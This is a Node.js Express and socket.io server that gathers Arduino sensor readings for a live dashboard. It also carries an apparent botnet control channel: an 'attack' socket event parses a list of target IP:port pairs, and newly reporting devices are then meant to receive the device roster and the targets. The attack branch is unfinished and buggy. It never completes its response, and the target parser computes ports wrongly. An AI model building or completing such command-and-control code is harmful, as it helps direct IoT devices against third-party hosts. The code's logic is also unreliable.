var express = require('express');
var app = express();
var http = require('http').Server(app);
var io = require('socket.io')(http);
var bodyParser = require('body-parser');

var knownIds = {};
var ipPortPair = [];
var targetJson = {};
var attack = false;

app.use(express.static('public'));

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));

app.get('/', function(req, res){
  res.sendFile(__dirname + '/index.html');
});

function sensorJSON(datetime, sensorValue, sensorName){
  
  var date = new Date();
  var ms = date.getMilliseconds();

  var data = "";
  data += " { x :[\'" + datetime +'.' + ms + "\'],";
  data += " y :[" + sensorValue + "],";
  data += " name : \'" + sensorName +"\'}";

  return data;
}

app.post("/ips", function(req, res) {

    var ip = req.body.ip;
    var port = req.body.port;
    var ipPort = {};

    ipPort.ip = ip;
    ipPort.port = port;

    ipPortPair.push(ipPort);
    res.end("ok. IP, port Received");
});


app.post("/", function(req, res){
  
  var id = req.body.id;
  var datetime = req.body.datetime;
  var sensorData = req.body.data;

  //if ID isn't known push it into our knownIds
  if(!(knownIds[id])) {
    //Default delay is 1 second
    knownIds[id] = {time:1000, changed:false};
    //console.log(knownIds);

    if(!attack) {
      res.end("ok");
    } else {
      /*{
          arduino:[{ip:2.1.3, port:123},...],
          targets:[{ip:2.1.3, port:123},...]
        }
      */
      
      var content = {};
      content.arduinos = ipPortPair;
      content.targets = targetJson;
      console.log("Content:");
      console.log(content);
      res.writeHead(200, {'Content-Type': 'application/json'});
      //res.send();
    }
  } else {
    //send the new delay value
    if(knownIds[id].changed == true) { 
      res.setHeader('Content-Length', knownIds[id].time.toString().length);
      res.writeHead(200, {'Content-Type': 'text/plain'});
      res.write(knownIds[id].time);
      res.end();

      knownIds[id].changed = false;
    } else {
      res.end("ok");
    }

  }

  console.log(knownIds);

  var date = new Date();
  var ms = date.getMilliseconds();
  req.body.datetime = req.body.datetime + '.' + ms;
  //req.body.datetime = ;

  //build the string to show on the clients
  var data = "";
  data += "ID = " + "\"" + id + "\"\n";
  data += "["
  if(sensorData.sensor0){
  data += sensorJSON(datetime, sensorData.sensor0, "sensor0");
  data += ",\n";
  }
  if(sensorData.sensor1){
  data += sensorJSON(datetime, sensorData.sensor1, "sensor1");
  data += " -]";
  }

  io.emit('iot data', data, req.body);

});

function parseTarget(targets) {
    //ip:port, ip:port, ...
    var ips = [];
    var ports = [];
    var targetJson = {};


    var ip, port;

    var ipPortPair, res;
    if(targets.indexOf(",") != -1) {
    //more than one IP:port
    ipPortPair = targets.substring(0, targets.indexOf(","));
    res = targets.substring(targets.indexOf(",")+1);
    } else {
      ipPortPair = targets;
      res = "";
    }

    var finished = false;

    while(!finished)
    {
      ip = ipPortPair.substring(0, ipPortPair.indexOf(":"));
      port = ipPortPair.substring(ipPortPair.indexOf(":") + 1)

      ips.push(ip);
      ports.push(port);

      if(res.indexOf(",") != -1) {
        ipPortPair = res.substring(0, res.indexOf(","));
      } else {
        //last element
      /*ipPortPair = res;
      ip = ipPortPair.substring(0, ipPortPair.indexOf(":"));
      port = ipPortPair.substring(ipPortPair.indexOf(":") + 1)

      ips.push(ip);
      ports.push(port);
      finished = true;*/
      ip = res.substring(0, res.indexOf(":"));
      port = res.substring(0, res.indexOf(":") + 1);
      finished = true;
    }

    res = res.substring(res.indexOf(",")+1);
    //console.log("ipP " + ipPortPair);
    //console.log("res " + res);
    }

    //console.log("ip");
    //console.log(ips);
    //console.log("port");
    //console.log(ports);

    targetJson.ips = ips;
    targetJson.ports = ports;
/*
   {
    targets: {
      ips:[ip1,ip2,ip3,]
      ports:[,,,]
    }
    arduinos: [{ip:algo, port:alguitomas},...] 
    }
  
    }
*/
    return targetJson;
}

io.on('connection', function(socket){
  console.log('a user connected');

  socket.on('disconnect', function(){
    console.log('user disconnected');
  });

  socket.on('update delay', function(data) {
    console.log('Arduino delay update');
    //console.log('Arduino ' + data.id + ' new delay set to: ' + data.time);
    knownIds[data.id].time = data.time;
    knownIds[data.id].changed = true;
  });

  socket.on('attack', function(targets) {
    targetJson = parseTarget(targets);    
    attack = true;
    console.log("Attack order received!");
  });

});

const PORT = 8080;

http.listen(PORT, function(){
  console.log('listening on: ' + PORT);
});